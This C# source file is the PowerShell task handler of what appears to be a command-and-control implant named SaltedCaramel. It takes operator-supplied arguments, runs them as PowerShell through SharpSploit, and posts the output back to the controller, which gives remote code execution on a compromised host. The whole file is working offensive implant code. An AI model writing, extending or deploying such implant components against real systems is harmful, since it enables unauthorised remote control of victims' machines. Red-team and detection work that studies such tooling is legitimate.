using Newtonsoft.Json;
using SharpSploit.Execution;
using System;
using System.Diagnostics;

namespace SaltedCaramel.Tasks
{
    class Powershell
    {
        internal static void Execute(SaltedCaramelTask task, SaltedCaramelImplant implant)
        {
            string args = task.@params;

            try
            {
                string result = Shell.PowerShellExecute(args);

                TaskResponse response = new TaskResponse(JsonConvert.SerializeObject(result), task.id);
                implant.PostResponse(response);
                implant.SendComplete(task.id);
            }
            catch (Exception e)
            {
                Debug.WriteLine("[!] Powershell - ERROR: " + e.Message);
                implant.SendError(task.id, e.Message);
            }
        }
    }
}
